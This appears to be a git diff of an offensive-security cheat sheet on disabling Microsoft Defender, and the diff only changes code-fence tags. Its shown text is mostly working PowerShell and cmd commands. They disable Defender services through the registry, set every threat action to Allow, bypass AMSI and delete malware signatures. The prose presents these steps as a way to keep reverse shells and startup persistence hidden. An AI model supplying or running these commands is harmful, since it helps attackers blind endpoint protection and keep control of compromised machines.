@@ -54,7 +54,7 @@ Here's a Powershell script by fiercebrute that also completely removes Defender 
 
 To disable most anti-virus features and services via directly changing registry entries, you can use these Powershell commands.  This requires SYSTEM privileges; if not available, use [StopDefenderService by dosxuz](https://github.com/dosxuz/DefenderStop) mentioned above.
 
-```
+```ps
 # Kill "Cloud-Delivered Protections" feature
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
 
@@ -76,7 +76,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 
 Generally, the Defender services can't be stopped, just disabled, therefore they'll return on next restart of the machine.  You could put the following commands into a ".ps1" script that is set to run at startup.  For persistence, this script could be followed by downloading and executing a shell, opening RDP or any preferred method.
 
-```
+```ps
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" -Name Start -Value 4
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name Start -Value 4
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sense" -Name Start -Value 4
@@ -84,7 +84,7 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sense" -Name Sta
 
 For your enjoyment, here is a pretty comprehensive list of all the Defender features you probably don't want complicating your reverse shells from executing succesfully.  If you want to use these in a hidden script that runs at startup, make sure to add `-ErrorAction SilentlyContinue` at the end of each line.
 
-```
+```ps
 Set-MpPreference -LowThreatDefaultAction Allow 
 Set-MpPreference -ModerateThreatDefaultAction Allow 
 Set-MpPreference -HighThreatDefaultAction Allow
@@ -103,17 +103,19 @@ Set-MpPreference -DisableRealTimeMonitoring 1
 
 Neat way to kill AMSI, for safety and fun.
 
-```
+```ps
 "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
 
 ```
 
 Finally, you can remove the signatures that Defender uses to identify malicious files.  If the computer has internet access, they will be downloaded again, almost immediately, so this is only effective within internal protected VPNs. 
 
-```
+```ps
 PS > cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0"
 PS > .\MpCmdRun.exe -RemoveDefinitions -All
-Or
+```
+or in cmd:
+```cmd
 Cmd > "%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
